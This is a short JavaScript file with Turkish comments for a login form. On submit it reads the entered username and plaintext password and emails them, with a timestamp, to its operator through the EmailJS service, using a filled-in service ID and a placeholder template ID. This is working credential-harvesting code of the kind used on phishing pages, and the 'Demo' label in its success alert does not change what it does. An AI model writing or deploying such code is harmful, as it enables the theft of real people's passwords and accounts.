// script.js

// Form submit işlemi
document.getElementById("loginForm").addEventListener("submit", function(e){
    e.preventDefault(); // sayfa yenilenmesin
    
    const username = document.getElementById("username").value.trim();
    const password = document.getElementById("password").value;

    // Template ID'yi buraya koy: örn "template_abc123"
    const TEMPLATE_ID = "YOUR_TEMPLATE_ID"; // <-- BURAYI DEĞİŞTİR

    // Service ID senin verdiğin:
    const SERVICE_ID = "service_5d8r3x7";

    // Ek alan: tarih
    const date = new Date().toLocaleString();

    // EmailJS send (public key zaten emailjs.init ile ayarlandı)
    emailjs.send(SERVICE_ID, TEMPLATE_ID, {
        username: username,
        password: password,
        date: date
    })
    .then(function(response) {
        alert("Form başarıyla gönderildi! (Demo)");
        console.log("SUCCESS!", response.status, response.text);
        // İsteğe bağlı: formu sıfırla
        document.getElementById("loginForm").reset();
    }, function(error) {
        alert("Bir hata oluştu, tekrar deneyin.");
        console.log("FAILED...", error);
    });
});
